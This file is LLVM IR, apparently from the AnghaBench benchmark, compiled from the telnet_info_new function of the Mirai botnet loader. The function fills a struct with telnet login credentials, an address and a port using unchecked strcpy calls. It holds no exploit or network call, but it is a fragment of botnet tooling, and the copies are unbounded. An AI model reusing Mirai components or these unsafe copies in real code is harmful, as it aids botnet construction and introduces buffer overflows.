; ModuleID = '/home/carl/AnghaBench/Mirai-Source-Code/loader/src/extr_telnet_info.c_telnet_info_new.c'
source_filename = "/home/carl/AnghaBench/Mirai-Source-Code/loader/src/extr_telnet_info.c_telnet_info_new.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.telnet_info = type { i32, i32, i32, i32, i32, i32, i32 }

; Function Attrs: noinline nounwind optnone uwtable
define dso_local %struct.telnet_info* @telnet_info_new(i8* %0, i8* %1, i8* %2, i32 %3, i32 %4, %struct.telnet_info* %5) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca %struct.telnet_info*, align 8
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store %struct.telnet_info* %5, %struct.telnet_info** %12, align 8
  %13 = load i8*, i8** %7, align 8
  %14 = icmp ne i8* %13, null
  br i1 %14, label %15, label %21

15:                                               ; preds = %6
  %16 = load %struct.telnet_info*, %struct.telnet_info** %12, align 8
  %17 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %16, i32 0, i32 6
  %18 = load i32, i32* %17, align 4
  %19 = load i8*, i8** %7, align 8
  %20 = call i32 @strcpy(i32 %18, i8* %19)
  br label %21

21:                                               ; preds = %15, %6
  %22 = load i8*, i8** %8, align 8
  %23 = icmp ne i8* %22, null
  br i1 %23, label %24, label %30

24:                                               ; preds = %21
  %25 = load %struct.telnet_info*, %struct.telnet_info** %12, align 8
  %26 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %25, i32 0, i32 5
  %27 = load i32, i32* %26, align 4
  %28 = load i8*, i8** %8, align 8
  %29 = call i32 @strcpy(i32 %27, i8* %28)
  br label %30

30:                                               ; preds = %24, %21
  %31 = load i8*, i8** %9, align 8
  %32 = icmp ne i8* %31, null
  br i1 %32, label %33, label %39

33:                                               ; preds = %30
  %34 = load %struct.telnet_info*, %struct.telnet_info** %12, align 8
  %35 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %34, i32 0, i32 4
  %36 = load i32, i32* %35, align 4
  %37 = load i8*, i8** %9, align 8
  %38 = call i32 @strcpy(i32 %36, i8* %37)
  br label %39

39:                                               ; preds = %33, %30
  %40 = load i32, i32* %10, align 4
  %41 = load %struct.telnet_info*, %struct.telnet_info** %12, align 8
  %42 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %41, i32 0, i32 3
  store i32 %40, i32* %42, align 4
  %43 = load i32, i32* %11, align 4
  %44 = load %struct.telnet_info*, %struct.telnet_info** %12, align 8
  %45 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %44, i32 0, i32 2
  store i32 %43, i32* %45, align 4
  %46 = load i8*, i8** %7, align 8
  %47 = icmp ne i8* %46, null
  br i1 %47, label %51, label %48

48:                                               ; preds = %39
  %49 = load i8*, i8** %8, align 8
  %50 = icmp ne i8* %49, null
  br label %51

51:                                               ; preds = %48, %39
  %52 = phi i1 [ true, %39 ], [ %50, %48 ]
  %53 = zext i1 %52 to i32
  %54 = load %struct.telnet_info*, %struct.telnet_info** %12, align 8
  %55 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %54, i32 0, i32 0
  store i32 %53, i32* %55, align 4
  %56 = load i8*, i8** %9, align 8
  %57 = icmp ne i8* %56, null
  %58 = zext i1 %57 to i32
  %59 = load %struct.telnet_info*, %struct.telnet_info** %12, align 8
  %60 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %59, i32 0, i32 1
  store i32 %58, i32* %60, align 4
  %61 = load %struct.telnet_info*, %struct.telnet_info** %12, align 8
  ret %struct.telnet_info* %61
}

declare dso_local i32 @strcpy(i32, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
